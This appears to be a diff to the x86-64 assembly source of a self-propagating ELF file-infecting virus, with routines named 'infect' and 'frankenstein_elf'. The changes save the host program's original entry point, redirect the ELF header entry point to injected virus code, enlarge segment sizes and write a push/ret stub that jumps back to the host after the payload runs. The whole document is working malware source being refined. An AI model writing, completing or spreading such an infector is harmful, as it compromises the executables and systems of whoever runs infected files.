@@ -227,6 +227,7 @@ BITS 64
 ; r14 + 436 ; vxoffset: dd 0
 ; r14 + 440 ; vxshoff: dd 0
 ; r14 + 444 ; vx_padding_size: dd 0
+; r14 + 448 ; original_entry_point: dd 0
 ;
 ; r14 + 500 = # of dirent entries returned from getdents64 syscall 
 ;
@@ -661,10 +662,13 @@ infect:
 					mov r10, [r13 + r12 + 16] 	;entry virtual addr (r14 + 400) = phdr->p_vaddr + phdr->p_filesz
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
 					mov qword [r14 + 400], r10				;save r14 + 400
-														;new entry point of infected file = r14 + 400 + ventry
+
+					mov r11, qword [r13 + 24]					; load address of original entry point from ELF header
+					mov qword [r14 + 448], r11			; save OEP to stack
+														; new entry point of infected file = r14 + 400 + ventry
 					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
-					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
-					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
+					mov r10, [r13 + r12 + 8]			; elf_phdr.p_offset  
+					add r10, [r13 + r12 + 32]			; elf_phdr.p_filesz offset
 					mov dword [r14 + 436], r10d
 					add qword [r13 + r12 + 32], vlen+6	;elf_phdr.p_filesz offset
 					add qword [r13 + r12 + 40], vlen+6	;elf_phdr.p_memsz offset
@@ -837,11 +841,13 @@ frankenstein_elf:
 		syscall
 
 	.write_jmp_to_oep:
+		xor r11, r11
+		mov r11, qword [r14 + 448]
 		mov rdx, 6
-		mov byte [r14 + 180], 0x68			;0x68 = push
-		mov dword [r14 + 181], r8d			;address of original host entry point
-		mov byte [r14 + 185], 0xc3			;0xc3 = ret
-		lea rsi, [r14+ 180]
+		mov byte [r14 + 150], 0x68			;0x68 = push
+		mov dword [r14 + 151], r11d			;address of original host entry point
+		mov byte [r14 + 155], 0xc3			;0xc3 = ret
+		lea rsi, [r14+ 150]
 		mov r10d, dword [r14 + 436]
 		add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
@@ -888,7 +894,7 @@ frankenstein_elf:
 		mov rax, 0x4d ;SYS_FTRUNCATE
 		syscall
 
-	.write_datasegment_totemp:
+	.write_remainingsegments_totemp:
 		xor r10, r10
 		mov rdx, qword [r14 + 408]				; original shoff
 		sub edx, dword [r14 + 424]				; offset of next segment after .text segment in host ELF
